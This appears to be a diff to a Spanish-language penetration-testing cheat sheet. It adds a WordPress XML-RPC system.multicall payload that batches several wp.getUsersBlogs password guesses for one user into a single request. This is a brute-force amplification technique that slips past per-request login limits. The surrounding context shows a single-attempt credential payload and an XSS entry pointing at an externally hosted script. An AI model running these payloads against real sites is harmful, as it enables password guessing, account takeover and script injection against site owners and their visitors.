@@ -62,6 +62,20 @@ Wordpress =>
 		 <value><string>pass2</string></value>
 
 		</methodCall>
+		
+	Si está activo el system.multicall y wp.getUsersBlogs =>
+		
+		<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
+
+		<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass1</string></value></data></array></value></data></array></value></member></struct></value>
+
+		<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass2</string></value></data></array></value></data></array></value></member></struct></value>
+
+		<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass3</string></value></data></array></value></data></array></value></member></struct></value>
+
+		<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass4</string></value></data></array></value></data></array></value></member></struct></value>
+
+		</data></array></value></param></params></methodCall>
 
 #XSS
 http://xss.rocks/xss.js
